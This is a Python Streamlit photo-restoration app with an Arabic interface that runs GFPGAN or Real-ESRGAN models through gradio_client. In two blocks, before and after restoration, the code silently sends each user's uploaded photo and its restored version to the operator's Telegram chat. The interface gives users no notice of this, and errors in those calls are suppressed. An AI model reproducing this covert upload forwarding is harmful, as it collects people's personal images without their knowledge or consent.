import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# 1. إعدادات واجهة البرنامج
st.set_page_config(page_title="Aziz Ultra Restore", layout="centered")
st.title("🌟 Aziz Ultra Restoration Studio")
st.markdown("ترميم كامل لتفاصيل الصورة: الوجه، الدين، والملابس")

# 2. جلب مفاتيح التشغيل من الـ Secrets
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except:
    bot = None

# 3. قسم رفع الصور
uploaded_file = st.file_uploader("ارفع الصورة القديمة هنا...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="📸 الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 بدء الترميم الكامل والشامل"):
        with st.spinner("جاري تحليل وترميم كافة تفاصيل الصورة (قد يستغرق وقتاً قليلاً)..."):
            try:
                # حفظ الصورة مؤقتاً للمعالجة
                temp_input = "temp_input.png"
                image.save(temp_input)

                # --- (أ) إرسال الأصل للتليجرام ---
                if bot and CHAT_ID:
                    try:
                        with open(temp_input, "rb") as f_in:
                            bot.send_photo(CHAT_ID, f_in, caption="📥 الأصل")
                    except:
                        pass

                # --- (ب) استدعاء محرك ترميم كامل ومحسن للصورة (Replicate GFPGAN الشامل) ---
                # هذا الموديل يركز على الصورة ككل، ليس فقط الوجه.
                try:
                    client = Client("sczhou/GFPGAN") # استخدام GFPGAN للترميم العام
                    result = client.predict(
                        img=handle_file(temp_input),
                        version="v1.4", # اصدار يركز على التفاصيل العامة
                        scale=2 # تكبير الصورة مرتين
                    )
                except Exception as e:
                    # محاولة احتياطية في حال تعطل المحرك الأول
                    client = Client("cjwbw/real-esrgan")
                    result = client.predict(
                        image=handle_file(temp_input),
                        model_name="RealESRGAN_x4plus", # ترميم شامل قوي
                        face_enhance=True
                    )
                
                # استلام مسار الصورة الناتجة
                restored_path = result if isinstance(result, str) else result[0]
                
                # --- (ج) عرض النتيجة في الموقع وزر الحفظ ---
                st.image(restored_path, caption="✅ تم الترميم الشامل بنجاح", use_container_width=True)
                
                with open(restored_path, "rb") as file:
                    st.download_button("📥 حفظ الصورة في جوالك", file, "Aziz_Full_Restore.png", "image/png")

                # --- (د) إرسال النتيجة النهائية للتليجرام ---
                if bot and CHAT_ID:
                    try:
                        with open(restored_path, "rb") as f_out:
                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة الشاملة")
                    except:
                        pass 
                
                # حذف الملف المؤقت
                os.remove(temp_input)
                
            except Exception as e:
                st.error(f"حدث خطأ أثناء المعالجة: {e}")
